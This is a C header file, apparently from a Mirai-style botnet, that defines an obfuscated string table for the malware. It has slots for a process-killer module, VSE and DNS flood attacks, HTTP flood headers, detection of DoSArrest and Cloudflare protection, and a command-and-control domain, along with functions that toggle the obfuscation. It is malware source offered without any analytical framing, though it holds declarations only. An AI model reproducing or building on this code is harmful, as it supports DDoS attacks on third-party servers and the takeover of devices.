#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

enum
{
	TABLE_KILLER_TCP            	= 1,
	TABLE_KILLER_PROC           	= 2,
	TABLE_KILLER_EXE            	= 3,
	TABLE_KILLER_FD             	= 4,
	TABLE_KILLER_CMDLINE        	= 5,
	TABLE_KILLER_SOFIA          	= 6,

	TABLE_ATK_VSE               	= 7,
	TABLE_ATK_RESOLVER          	= 8,
	TABLE_ATK_NSERV             	= 9,

	TABLE_HTTP_ONE              	= 10,
	TABLE_HTTP_TWO              	= 11,
	TABLE_HTTP_THREE            	= 12,
	TABLE_HTTP_FOUR             	= 13,
	TABLE_HTTP_FIVE             	= 14,

	TABLE_ATK_KEEP_ALIVE            = 15,  /* "Connection: keep-alive" */
	TABLE_ATK_ACCEPT                = 16,  // "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" // */
	TABLE_ATK_ACCEPT_LNG            = 17,  // "Accept-Language: en-US,en;q=0.8"
	TABLE_ATK_CONTENT_TYPE          = 18,  // "Content-Type: application/x-www-form-urlencoded"
	TABLE_ATK_SET_COOKIE            = 19,  // "setCookie('"
	TABLE_ATK_REFRESH_HDR           = 20,  // "refresh:"
	TABLE_ATK_LOCATION_HDR          = 21,  // "location:"
	TABLE_ATK_SET_COOKIE_HDR        = 22,  // "set-cookie:"
	TABLE_ATK_CONTENT_LENGTH_HDR    = 23,  // "content-length:"
	TABLE_ATK_TRANSFER_ENCODING_HDR = 24,  // "transfer-encoding:"
	TABLE_ATK_CHUNKED               = 25,  // "chunked"
	TABLE_ATK_KEEP_ALIVE_HDR        = 26,  // "keep-alive"
	TABLE_ATK_CONNECTION_HDR        = 27,  // "connection:"
	TABLE_ATK_DOSARREST             = 28,  // "server: dosarrest"
	TABLE_ATK_CLOUDFLARE_NGINX      = 29,  // "server: cloudflare-nginx"

	TABLE_CNC_DOMAIN            	= 30,
	TABLE_MAX_KEYS              	= 31
};

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t);
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
